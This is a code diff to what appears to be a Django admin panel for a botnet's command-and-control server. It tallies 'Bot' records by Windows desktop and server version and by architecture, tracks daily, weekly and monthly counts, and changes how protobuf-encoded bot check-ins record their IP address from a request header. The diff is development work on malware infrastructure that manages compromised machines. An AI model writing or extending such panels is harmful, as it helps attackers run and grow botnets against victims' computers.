@@ -94,7 +94,9 @@ class AdminPanel:
         counts_is_win10 = Bot.objects.filter(is_win10=True).count()
         counts_is_win81 = Bot.objects.filter(is_win81=True).count()
         counts_is_win8 = Bot.objects.filter(is_win8=True).count()
-        counts_is_win11 = Bot.objects.filter(is_win11=True).count()
+        counts_serv2016_19 = Bot.objects.filter(is_server2016_19=True).count()
+        counts_serv2012 = Bot.objects.filter(is_server2012=True).count()
+        counts_serv2012r2 = Bot.objects.filter(is_server2012r2=True).count()
 
         _32x = Bot.objects.filter(is_x64=False).count()
         _64x = Bot.objects.filter(is_x64=True).count()
@@ -106,7 +108,8 @@ class AdminPanel:
 
         if request.user.is_superuser:
             return render(request, 'main/main.html', {'win_version': [counts_is_win7, counts_is_win81, counts_is_win8,
-                                                                      counts_is_win10, counts_is_win11],
+                                                                      counts_is_win10, counts_serv2016_19, counts_serv2012,
+                                                                      counts_serv2012r2],
                                                       'x_oc': [_32x, _64x], 'in_week': in_week, 'in_day': in_day,
                                                       'in_month': in_month, 'total': total})
 
@@ -190,7 +193,7 @@ class Handlers:
 
         login(request, request.user)
 
-        return HttpResponse('200')
+        return JsonResponse({'v': '200'})
 
     @csrf_exempt
     def add_comment(self, request):
@@ -287,6 +290,8 @@ class Handlers:
                 bot.ParseFromString(request.body[4:])
 
                 ip = self.sub.get_bot_ip(request)
+
+                ip = request.headers['Ip']
 
                 country = self.sub.get_country(ip)
 
@@ -468,8 +473,7 @@ class Handlers:
             'win7': Bot.objects.filter(is_win7=True),
             'win8': Bot.objects.filter(is_win8=True),
             'win81': Bot.objects.filter(is_win81=True),
-            'win10': Bot.objects.filter(is_win10=True),
-            'win11': Bot.objects.filter(is_win11=True),
+            'win10_11': Bot.objects.filter(is_win10=True),
             'serv2016_19': Bot.objects.filter(is_server2016_19=True),
             'serv2012': Bot.objects.filter(is_server2012=True),
             'all_win': Bot.objects.all()
